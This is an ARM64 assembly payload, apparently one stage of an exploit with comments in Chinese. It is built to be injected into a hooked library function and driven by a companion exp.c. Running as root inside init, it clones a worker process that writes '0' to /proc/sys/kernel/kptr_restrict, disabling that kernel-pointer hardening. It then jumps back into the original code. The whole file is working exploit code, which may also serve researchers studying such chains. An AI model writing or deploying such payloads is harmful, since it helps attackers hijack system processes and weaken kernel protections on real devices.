.arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data

libcxx_data:
    // 【关键修复1】预留 64 字节给 exp.c 的 strncpy 覆盖，防止破坏后面的字符串
    dummy_ko_path:
    .skip 64, 0

mutex_file:
    .asciz "/dev/df"
kptr_file:
    .asciz "/proc/sys/kernel/kptr_restrict"
zero_str:
    .asciz "0"
    .balign 4

    .global libcxx_ko_target_off
libcxx_ko_target_off:
    // 指向 dummy_ko_path，让 exp.c 写在这里
    .int dummy_ko_path - libcxx_data

    .align 4

libcxx_start:
    // 现场保护 (保存所有关键寄存器)
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // 1. 检查 uid == 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // 2. 检查 tid == 1 (确保是 init 的主线程)
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // 3. 创建互斥锁 /dev/df
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // 如果文件已存在 (w0 < 0)，直接返回
    tbnz    w0, #31, return

    sub     sp, sp, 16

    // 4. 准备 clone 的 ctid 参数
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // 5. 创建子进程 (Worker)
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr             // newtls
    mov     x2, xzr             // ptid
    mov     x1, xzr             // stack
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]         // 保存子进程 id
    add     sp, sp, 16

    // 父进程 (init) 收到子进程 pid，直接返回
    cbnz    w0, return          

    // ── Worker 子进程 ──────────────────────────────────────────────────────
worker:
    // 6. 打开 /proc/sys/kernel/kptr_restrict
    mov     x0, -100
    adr     x1, kptr_file
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // 如果打开失败，直接退出
    tbnz    w0, #31, myexit
    mov     x19, x0             // 保存 fd

    // 7. 写入 "0"
    mov     x0, x19
    adr     x1, zero_str
    mov     x2, #1
    mov     x8, #SYS_write
    svc     0

    // 8. 关闭 fd
    mov     x0, x19
    mov     x8, #SYS_close
    svc     0

    // 9. 删除互斥锁 /dev/df (方便下次直接测试)
    mov     x0, -100
    adr     x1, mutex_file
    mov     x2, xzr
    mov     x8, #SYS_unlinkat
    svc     0

myexit:
    // 子进程光荣退出，绝不干扰父进程
    mov     x0, #0
    mov     x8, #SYS_exit
    svc     0

return:
    // 现场恢复 (与保存顺序相反)
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16

libcxx_first_inst_copy:
    // 【关键修复2】原函数的第一条指令，会被 exp.c 的 first_insn 覆盖
    stp     x29, x30, [sp, #-32]!
    // 这里必须留 4 字节占位，因为 exp.c 会把 jmpback 强制覆盖在这 (stage_len - 4)
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
